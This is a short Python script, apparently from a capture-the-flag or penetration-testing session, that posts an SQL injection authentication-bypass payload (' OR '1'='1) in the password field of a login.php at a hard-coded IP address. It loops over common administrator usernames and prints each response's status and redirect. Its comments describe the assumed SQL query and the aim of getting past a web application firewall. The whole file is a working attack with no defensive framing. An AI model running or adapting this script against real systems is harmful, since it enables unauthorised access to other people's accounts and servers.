import requests

# Password-field injection assuming query might be: SELECT * FROM users WHERE username='X' AND password='Y'
# If username field is not filtered for existence-testing, and password field bypasses WAF,
# try classic auth bypass purely via password for a few common usernames
for u in ["admin", "operator", "root", "commander"]:
    r = requests.post("http://52.66.177.113/login.php",
                       data={"username": u, "password": "' OR '1'='1"},
                       allow_redirects=False)
    print(u, r.status_code, r.headers.get('Location'))
